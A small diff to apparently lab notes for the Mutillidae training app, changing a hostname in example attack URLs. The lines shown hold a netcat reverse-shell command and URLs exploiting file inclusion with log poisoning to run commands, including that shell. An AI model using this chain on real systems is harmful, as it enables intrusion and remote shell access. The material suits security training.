@@ -12,6 +12,6 @@ Example cmd:
 	nc -e /bin/sh 127.0.0.1 81
 	
 
-URL: http://mutillidae.local/index.php?page=/var/log/apache2/localhost-access.log&cmd=ls
-URL: http://mutillidae.local/index.php?page=/var/log/apache2/localhost-access.log&cmd=/usr/bin/nc%20-e%20/bin/sh%20127.0.0.1%2081
+URL: http://mutillidae.localhost/index.php?page=/var/log/apache2/localhost-access.log&cmd=ls
+URL: http://mutillidae.localhost/index.php?page=/var/log/apache2/localhost-access.log&cmd=/usr/bin/nc%20-e%20/bin/sh%20127.0.0.1%2081
 
